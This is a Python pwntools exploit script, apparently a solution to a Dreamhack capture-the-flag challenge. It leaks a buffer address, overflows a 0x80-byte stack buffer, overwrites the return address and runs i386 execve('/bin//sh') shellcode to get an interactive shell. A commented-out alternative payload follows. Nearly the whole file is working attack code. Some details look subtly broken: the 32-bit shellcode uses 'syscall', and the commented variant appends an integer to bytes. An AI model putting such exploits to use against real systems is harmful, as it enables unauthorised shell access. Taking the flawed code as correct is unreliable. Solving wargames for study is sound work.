from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 9255

# Connect
r = remote(HOST, PORT)

# Set arch
context.arch = 'i386'
context.endian = 'little'

# Get buf Address
buf_addr = r.recvline()[7:-2]
buf_addr = int(buf_addr.decode("utf-8"), 16)

print("[+] buf address : " + hex(buf_addr))

# Shellcode
shellcode = 'mov eax, 0x68732f2f\n'
shellcode += 'push eax\n'
shellcode += 'mov eax, 0x6e69622f\n'
shellcode += 'push eax\n'
shellcode += 'mov ebx, esp\n'
shellcode += 'xor ecx, ecx\n'
shellcode += 'xor edx, edx\n'
shellcode += 'mov eax, 0x0b\n'
shellcode += 'syscall'

shellcode = asm(shellcode)

# Write Payload
addr_shellcode = buf_addr + 0x80 + 0x4 + 0x4
print("[+] shellcode address : " + hex(addr_shellcode))
payload = b'A'*0x80 + b'B'*4
payload += p32(addr_shellcode)
payload += shellcode

r.send(payload)
r.interactive()


# Write Payload
# payload = shellcode
# payload += b'B'*(0x80 - len(shellcode))
# payload += b'C'*4
# payload += buf_addr

# print('payload len : ', len(payload))
# print('addr len : ', len(buf_addr))

# r.send(payload)
# r.interactive()
